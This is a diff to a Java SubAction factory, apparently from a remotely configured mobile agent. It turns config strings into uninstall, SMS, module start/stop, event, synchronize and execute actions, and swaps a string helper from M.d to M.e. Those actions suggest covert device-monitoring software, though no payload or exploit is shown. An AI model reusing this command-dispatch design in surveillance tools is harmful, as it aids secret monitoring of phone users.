@@ -49,7 +49,7 @@ public abstract class SubAction {
 		this.status = Status.self();
 		this.conf = conf;
 
-		stop = conf.getBoolean(M.d("stop"), false); //$NON-NLS-1$        
+		stop = conf.getBoolean(M.e("stop"), false); //$NON-NLS-1$        
 
 		parse(conf);
 	}
@@ -72,28 +72,28 @@ public abstract class SubAction {
 			Check.asserts(type != null, "factory: null type"); //$NON-NLS-1$
 
 		// TODO: messages file
-		if (type.equals(M.d("uninstall"))) { //$NON-NLS-1$
+		if (type.equals(M.e("uninstall"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
 			}
 			
 			return new UninstallAction(params);
-		} else if (type.equals(M.d("sms"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("sms"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
 			}
 			
 			return new SmsAction(params);
-		} else if (type.equals(M.d("module"))) { //$NON-NLS-1$
-			String status = params.getString(M.d("status")); //$NON-NLS-1$
-			if (status.equals(M.d("start"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("module"))) { //$NON-NLS-1$
+			String status = params.getString(M.e("status")); //$NON-NLS-1$
+			if (status.equals(M.e("start"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_START_MODULE ***");//$NON-NLS-1$
 					Check.log(TAG + " params: " + params );
 				}
 				
 				return new StartModuleAction(params);
-			} else if (status.equals(M.d("stop"))) { //$NON-NLS-1$
+			} else if (status.equals(M.e("stop"))) { //$NON-NLS-1$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_STOP_MODULE ***");//$NON-NLS-1$
@@ -101,15 +101,15 @@ public abstract class SubAction {
 				
 				return new StopModuleAction(params);
 			}
-		} else if (type.equals(M.d("event"))) { //$NON-NLS-1$
-			String status = params.getString(M.d("status")); //$NON-NLS-1$
-			if (status.equals(M.d("enable"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("event"))) { //$NON-NLS-1$
+			String status = params.getString(M.e("status")); //$NON-NLS-1$
+			if (status.equals(M.e("enable"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_ENABLE_EVENT ***");//$NON-NLS-1$
 				}
 				
 				return new EnableEventAction(params);
-			} else if (status.equals(M.d("disable"))) { //$NON-NLS-1$
+			} else if (status.equals(M.e("disable"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_DISABLE_EVENT ***");//$NON-NLS-1$
 				}
@@ -117,8 +117,8 @@ public abstract class SubAction {
 				return new DisableEventAction(params);
 
 			}
-		} else if (type.equals(M.d("synchronize"))) { //$NON-NLS-1$
-			boolean apn = params.has(M.d("apn")); //$NON-NLS-1$
+		} else if (type.equals(M.e("synchronize"))) { //$NON-NLS-1$
+			boolean apn = params.has(M.e("apn")); //$NON-NLS-1$
 			
 			if (apn) {
 				if (Cfg.DEBUG) {
@@ -134,14 +134,14 @@ public abstract class SubAction {
 				return new SyncActionInternet(params);
 			}
 
-		} else if (type.equals(M.d("execute"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("execute"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
 			}
 			
 			return new ExecuteAction(params);
 
-		} else if (type.equals(M.d("log"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("log"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
 			}
